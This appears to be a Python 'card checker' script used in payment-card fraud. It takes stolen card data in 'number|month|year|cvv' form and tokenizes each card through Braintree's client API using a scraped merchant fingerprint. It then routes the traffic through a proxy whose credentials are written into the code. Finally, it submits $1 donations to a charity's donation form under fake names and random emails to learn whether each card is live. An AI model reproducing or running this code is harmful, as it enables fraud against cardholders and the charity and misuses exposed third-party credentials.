import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-ratelimit:sgtxdhw0ygw5"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'script',
	    'sec-fetch-mode': 'no-cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = session.get(
	    f'https://api.braintreegateway.com/merchants/d3439ytwqgbfzqp8/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.31.0&authorizationFingerprint=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDc5MzA5NzIsImp0aSI6ImFhY2YyMDk1LTM1MTgtNDEzZS04OTQ5LWQ1YWI0YjZkNjM1MCIsInN1YiI6ImQzNDM5eXR3cWdiZnpxcDgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImQzNDM5eXR3cWdiZnpxcDgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.ISW_MtRF4GP60Q7iR5eS5bBV6xKtaroRgCdIJ8IYAF-ixKAZL8ejA7nTEmlmo-PnpXKR5LTWHMegMURSEfEySg&_meta%5Bintegration%5D=dropin&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=dc68f882-ca0b-478f-822b-f32de47cd9c3&share=false&&creditCard%5Bnumber%5D={n}&creditCard%5BexpirationMonth%5D={mm}&creditCard%5BexpirationYear%5D={yy}&creditCard%5Bcvv%5D=&_method=POST&callback=callback_json4ae10562cadf430da71e900a30020c24',
	    headers=headers,
	)
	
	nonce = re.search(r'"nonce":"(.*?)"', response.text).group(1)
	#print(nonce)
	
	headers = {
	    'authority': 'icmfoundation.org',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://icmfoundation.org',
	    'referer': 'https://icmfoundation.org/donate/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'firstName': 'Rodam',
	    'lastName': 'User',
	    'amount': '1',
	    'email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    'cvv': f'{cvc}',
	    'payment_method_nonce': f'{nonce}',
	}
	
	response = session.post('https://icmfoundation.org/braintree-process-payment', headers=headers, data=data)
	
	try:
		result = re.search(r'<h4>(.*?)</h4>', response.text).group(1)
	except:
		result = re.search(r'<h2 id="h2_thanks">(.*?) </h2>', response.text).group(1)
	
	return (result)
